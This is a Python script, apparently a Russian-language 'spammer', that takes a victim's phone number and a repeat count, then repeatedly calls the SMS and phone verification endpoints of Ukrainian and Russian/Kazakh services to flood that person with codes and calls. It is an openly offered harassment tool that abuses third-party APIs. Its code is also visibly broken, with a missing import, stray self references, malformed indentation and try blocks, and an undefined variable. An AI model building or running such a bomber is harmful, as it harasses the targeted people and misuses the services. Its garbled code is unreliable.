# Version 1.0
import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *

console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
console.print('''[bold red]
 -----------------------------------------
| Создатель - Hironotori                  |
| Telegram - @Hironotori                  |
| Человек которий сильно помог - @GGClubbb|
 -----------------------------------------
''')
conut = console.input('[cyan]Выберите вашу страну:\n[red][1] - Украина\n[2] - Россия\n[blue]spammer>> ')

console.print("[purple]Введите номер телефонa (без +): ")

self.formatted_phone = console.input("[blue]spammer>> ")

run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))

def ukr():
for _ in track(range(run)):
 try:
     print('мазайкааа')
     requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + self.formatted_phone, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
     print('НЕ отправлено мазайка')
except:

 try:
     print('уклон вход')
     requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
 except:
     print('Не отправельно уклон вход')
 try:
     print('уклон регастратура')
     requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
 except:
     print('Не отправельно уклон регестратура')







def russ():
         for _ in track(range(run)):
                headers = {"User-Agent": fake_useragent.UserAgent().random}
            try:
                requests.post("https://api-proxy.choco.kz/user/v2/code", data={"login": number, "client_id": "-5", "dispatch_type": "call"}, headers=headers)
                pass
         except:
                pass


if conut =='1':
        ukr()
elif conut == '2':
        russ()
